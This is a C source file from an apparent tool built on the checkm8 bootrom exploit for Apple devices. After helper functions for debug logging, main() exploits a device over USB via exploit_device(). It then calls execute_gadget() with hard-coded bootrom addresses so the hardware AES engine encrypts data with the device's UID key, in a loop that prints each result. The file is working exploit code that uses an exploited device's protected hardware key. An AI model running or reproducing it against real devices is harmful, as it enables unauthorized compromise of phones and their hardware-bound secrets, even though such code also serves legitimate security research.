#include "checkm8.h"

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "usb_helpers.h"
#include "command.h"
#include "payload.h"

#ifdef CHECKM8_LOGGING
#include <stdarg.h>
#include <execinfo.h>
#endif

void checkm8_debug_indent(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    void *traces[100];
    int depth = backtrace(traces, 100) - 5;
    for(int i = 0; i < depth; i++)
    {
        printf("\t");
    }
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

void checkm8_debug_block(const char *format, ...)
{
#ifdef CHECKM8_LOGGING
    va_list args;

    va_start (args, format);
    vprintf(format, args);
    va_end(args);
#endif
}


int main()
{
    int ret;
    struct dev_cmd_resp *resp;
    struct pwned_device *dev = exploit_device();
    if(dev == NULL || dev->status == DEV_NORMAL)
    {
        printf("Failed to exploit device\n");
        return -1;
    }

    unsigned long long data0 = 0xdeadbeefdeadbeef;
    unsigned long long data1 = 0xdeadbeefdeadbeef;

    ret = open_device_session(dev);
    if(IS_CHECKM8_FAIL(ret))
    {
        printf("failed to open device session\n");
        return -1;
    }

    for(int i = 0; i < 100000; i++)
    {
        printf("encrypting ");
        for(int j = 0; j < 8; j++)
        {
            printf("%02X", ((unsigned char *) &data0)[j]);
        }

        for(int j = 0; j < 8; j++)
        {
            printf("%02X", ((unsigned char *) &data1)[j]);
        }

        printf("\n");
        resp = execute_gadget(dev,
                              0x100000f0c, 16, 9,
                              16, // action (AES_ENCRYPT)
                              0x1800b0048, 0x1800b0010, // dest and src addresses
                              16, // data size
                              0x20000201, // AES_UID_KEY
                              0, 0, // no
                              data0, data1);

        if(IS_CHECKM8_FAIL(resp->ret))
        {
            printf("failed\n");
            return -1;
        }

        memcpy(&data0, &resp->data[0], 8);
        memcpy(&data1, &resp->data[8], 8);
        free_dev_cmd_resp(resp);

        printf("\t-> ");
        for(int j = 0; j < 8; j++)
        {
            printf("%02X", ((unsigned char *) &data0)[j]);
        }

        for(int j = 0; j < 8; j++)
        {
            printf("%02X", ((unsigned char *) &data1)[j]);
        }
        printf("\n");
        usleep(250000);
    }

    close_device_session(dev);
    free_device(dev);
}
